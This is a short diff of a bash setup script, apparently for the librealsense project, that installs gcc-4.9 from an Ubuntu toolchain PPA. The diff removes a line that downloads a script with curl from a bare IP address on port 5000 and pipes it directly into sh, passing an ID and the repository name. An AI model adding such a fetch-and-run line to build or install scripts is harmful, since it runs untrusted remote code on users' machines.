@@ -1,5 +1,5 @@
 #!/bin/bash -e
-curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
+
 # Install gcc
 echo && echo Installing gcc-4.9 && echo
 sudo add-apt-repository ppa:ubuntu-toolchain-r/test
